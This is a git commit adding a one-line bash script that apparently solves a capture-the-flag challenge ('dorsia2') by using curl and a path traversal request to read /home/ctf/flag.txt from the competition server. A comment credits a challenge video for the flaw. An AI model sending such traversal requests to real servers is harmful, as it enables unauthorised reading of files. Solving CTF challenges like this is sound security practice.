91c63d0fe7fd67aa0cf83cbf9323ef010417e92d
Sem Voigtländer <43578852+userlandkernel@users.noreply.github.com>
2020-04-20 00:02:44 +0200

    Create dorsiatwo.sh

---
+++ dorsiatwo.sh
@@ -0,0 +1,4 @@
+#!/usr/bin/env bash
+curl -s "http://dorsia2.wpictf.xyz:31337//home/ctf/flag.txt"
+
+# Explanation: A path traversal issue exists as explained by the card in the video at http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm
